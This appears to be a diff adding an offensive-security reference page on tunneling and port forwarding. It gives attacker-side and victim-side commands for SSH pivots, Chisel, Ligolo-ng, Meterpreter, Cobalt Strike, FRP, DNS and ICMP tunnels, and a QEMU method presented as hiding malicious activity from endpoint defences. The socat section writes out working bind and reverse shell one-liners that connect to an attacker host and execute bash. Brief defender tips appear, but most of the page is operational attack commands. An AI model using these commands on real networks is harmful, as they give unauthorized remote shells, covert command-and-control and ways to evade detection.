@@ -1,0 +1,305 @@
+---
+title: "Tunneling and Port Forwarding"
+description: "Comprehensive reference for SSH tunnels, SOCKS proxies, Chisel, Ligolo-ng, Socat, reGeorg, ngrok, Cloudflared, FRP, DNS/ICMP tunneling, and covert QEMU-based tunnels."
+---
+
+## Overview
+
+Tunneling and port forwarding allow attackers to pivot through compromised hosts, bypass firewall restrictions, and establish covert communications channels. This page is a comprehensive reference for tools and techniques.
+
+<Warning>
+**ICMP** and **SYN** scans cannot be tunnelled through SOCKS proxies. Always use `-Pn` (disable ping discovery) and `-sT` (TCP connect scan) with nmap through a proxy.
+</Warning>
+
+## SSH Tunneling
+
+### Local Port Forwarding
+
+Forward a local port through an SSH server to a destination:
+
+```bash
+# Local port 8080 → target host:80 via compromised SSH server
+ssh -L 8080:target_host:80 user@ssh_server
+
+# Access the victim's local Oracle DB from attacker
+sudo ssh -L 1521:10.10.10.5:1521 -N -f -l username compromised_host
+```
+
+### Remote Port Forwarding
+
+Forward a remote port back to the attacker:
+
+```bash
+# Expose attacker port 9090 via compromised host
+ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@attacker_ip
+
+# Reverse shell from internal through DMZ
+ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@attacker_ip -vN
+```
+
+### SOCKS Proxy (Dynamic Forwarding)
+
+```bash
+# All traffic through compromised host
+ssh -f -N -D 1080 username@compromised_host
+# Use with proxychains:
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
+proxychains nmap -sT -p 80,443 10.10.10.0/24
+```
+
+### VPN Tunnel over SSH
+
+```bash
+ssh root@server -w any:any   # Create tun interfaces on both ends
+# Client side
+ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0
+ip link set tun0 up
+# Server side
+ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0
+ip link set tun0 up
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
+```
+
+<Note>
+**CVE-2023-48795 (Terrapin Attack):** The 2023 Terrapin downgrade attack can let a MitM tamper with the early SSH handshake and inject data into forwarded channels. Ensure OpenSSH ≥ 9.6 or disable `chacha20-poly1305@openssh.com` and `*-etm@openssh.com` algorithms.
+</Note>
+
+## SSHuttle
+
+Transparent proxy-based VPN over SSH:
+
+```bash
+pip install sshuttle
+sshuttle -r user@host 10.10.10.0/24
+
+# With private key
+sshuttle -D -r user@host 10.10.10.0/24 0/0 --ssh-cmd 'ssh -i ./id_rsa'
+```
+
+## Chisel
+
+[Chisel](https://github.com/jpillora/chisel) — HTTP-based tunnel with SOCKS5 support. Use the same version on client and server.
+
+```bash
+# SOCKS proxy (attacker = server, victim = client)
+./chisel server -p 8080 --reverse  # Attacker
+./chisel client 10.10.14.3:8080 R:socks  # Victim
+# Use proxychains with port 1080
+
+# Port forwarding
+./chisel server -p 12312 --reverse  # Attacker
+./chisel client 10.10.14.20:12312 R:4505:127.0.0.1:4505  # Victim
+```
+
+## Ligolo-ng
+
+[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) — Go-based tunneling with automatic routing. Use the same version for agent and proxy.
+
+```bash
+# Attacker (proxy server)
+sudo ./proxy -selfcert
+interface_create --name "ligolo"
+certificate_fingerprint
+
+# Victim (agent)
+./agent -connect <proxy_ip>:11601 -v -accept-fingerprint <fingerprint>
+
+# Attacker — start routing
+session
+1
+tunnel_start --tun "ligolo"
+ifconfig  # View agent network
+interface_add_route --name "ligolo" --route 10.10.10.0/24
+```
+
+## Socat
+
+```bash
+# Bind shell
+victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
+attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
+
+# Reverse shell
+attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
+victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
+
+# Port-to-port forwarding
+socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
+
+# Through a SOCKS proxy
+socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
+```
+
+## Meterpreter
+
+```bash
+# Port forwarding inside a session
+portfwd add -l <attacker_port> -p <remote_port> -r <remote_host>
+
+# SOCKS proxy
+background
+route add 10.10.10.0 255.255.255.0 <session_id>
+use auxiliary/server/socks_proxy
+run  # Listens on 1080
+echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf
+```
+
+## Cobalt Strike
+
+```bash
+# SOCKS proxy via beacon
+beacon> socks 1080
+proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
+
+# Reverse port forward (to Team Server)
+rportfwd 8080 attacker_internal_host 80
+```
+
+## reGeorg
+
+Web-based tunnel using uploaded web shells (ashx/aspx/js/jsp/php):
+
+```bash
+python reGeorgSocksProxy.py -p 8080 -u http://target.com:8080/tunnel/tunnel.jsp
+```
+
+## ngrok
+
+```bash
+# Expose local TCP port
+./ngrok tcp 4444
+# Result: 0.tcp.ngrok.io:12345
+
+# Expose local HTTP service
+./ngrok http file:///tmp/httpbin/
+
+# Expose internal HTTP service with auth
+./ngrok http localhost:8080 --host-header=rewrite --auth="user:password"
+```
+
+## Cloudflared (Cloudflare Tunnel)
+
+Create outbound tunnels without inbound firewall rules:
+
+```bash
+# Quick one-liner tunnel
+cloudflared tunnel --url http://localhost:8080
+
+# SOCKS5 pivot
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+
+# Persistent named tunnel
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+cloudflared tunnel run mytunnel
+```
+
+## FRP (Fast Reverse Proxy)
+
+[FRP](https://github.com/fatedier/frp) supports TCP, UDP, HTTP/S, SOCKS, and P2P NAT hole-punching:
+
+```bash
+# Attacker server (frps.toml)
+./frps -c frps.toml  # Listens on 0.0.0.0:7000
+
+# Victim (frpc.toml)
+./frpc -c frpc.toml  # Exposes 127.0.0.1:3389 as frps:5000
+```
+
+```toml
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name = "rdp"
+type = "tcp"
+localIP = "127.0.0.1"
+localPort = 3389
+remotePort = 5000
+```
+
+## DNS Tunneling
+
+### DNSCat2
+
+Establishes a C2 channel through DNS — no root required:
+
+```bash
+# Attacker
+ruby ./dnscat2.rb tunneldomain.com
+
+# Victim
+./dnscat2 tunneldomain.com
+
+# Port forwarding via dnscat
+listen 127.0.0.1:8080 10.0.0.20:80
+```
+
+### Iodine
+
+Tunnel IP over DNS (root required on both sides):
+
+```bash
+attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
+victim> iodine -f -P P@ssw0rd tunneldomain.com -r
+# Then SSH through tunnel:
+ssh user@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
+```
+
+## ICMP Tunneling
+
+### ptunnel-ng
+
+```bash
+# Victim (receives ICMP)
+sudo ptunnel-ng
+
+# Attacker
+sudo ptunnel-ng -p <server_ip> -l 2222 -r <dest_ip> -R <dest_port>
+ssh -p 2222 -l user 127.0.0.1
+```
+
+## Covert VM-Based Tunnels (QEMU)
+
+Run a VM to hide C2 activity from host-based EDR:
+
+```powershell
+# Windows victim — no admin required, portable binaries only
+qemu-system-x86_64.exe ^
+   -m 256M ^
+   -drive file=tc.qcow2,if=ide ^
+   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+   -device e1000,netdev=n0 ^
+   -nographic
+```
+
+- Port 2222 on the Windows host forwards to port 22 inside the Tiny Core Linux VM.
+- All malicious activity stays inside the VM — host security tools see only benign loopback traffic.
+
+<Warning>
+Defenders: Alert on unexpected QEMU/VirtualBox binaries in user-writable paths, and hunt for rare listening ports (2222, 10022) created immediately after a QEMU process launch.
+</Warning>
+
+## Windows netsh Port Forwarding
+
+```cmd
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
+netsh interface portproxy show v4tov4
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
+```
+
+## Other Tools
+
+- [Rpivot](https://github.com/klsecservices/rpivot) — Reverse SOCKS4 tunnel from victim
+- [Plink.exe](https://www.putty.org/) — Console PuTTY SSH client for Windows port forwarding
+- [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) — SOCKS over RDP Dynamic Virtual Channels
+- [ssf](https://github.com/securesocketfunneling/ssf) — Secure Socket Funneling
+- [3proxy](https://github.com/z3APA3A/3proxy) — Tiny free proxy server
+
+## References
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization (TrustedSec)](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research — Storm-2603 AK47C2 DNS/HTTP C2 channel](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [Inside Ink Dragon: Relay Network and ShadowPad IIS module (Check Point)](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
